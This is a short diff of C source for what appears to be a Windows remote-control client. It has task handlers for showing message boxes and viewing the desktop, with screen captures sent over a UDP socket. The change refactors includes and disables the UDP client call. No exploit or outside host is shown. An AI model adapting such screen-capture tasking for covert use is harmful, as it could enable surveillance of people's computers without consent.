@@ -1,14 +1,8 @@
-#include <tchar.h> // _tcscpy_s, _tcscmp
-
 #include "Commands.h"
+#include "UDPClient.h"
 #include "..\Debugger.h"
 
-#pragma comment(lib, "gdiplus")
-
-SOCKET InitUDPClient()
-{
-	return INVALID_SOCKET;
-}
+#include <tchar.h> // _tcscpy_s, _tcscmp
 
 VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result)
 {
@@ -44,14 +38,14 @@ VOID SendDesktopScreen(LPVOID socket)
 VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result)
 {
 	static HANDLE hThread = NULL;
-	static SOCKET socket = INVALID_SOCKET;
+	static SOCKET socket  = INVALID_SOCKET;
 
 	int x = 0;
 	if (_stscanf_s(args, TEXT("%d"), &x) == 0) // No args == start or work if started
 	{
 		if (!hThread)
 		{
-			socket = InitUDPClient();
+			socket = INVALID_SOCKET; // InitUDPClient();
 			if (socket == INVALID_SOCKET)
 			{
 				_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
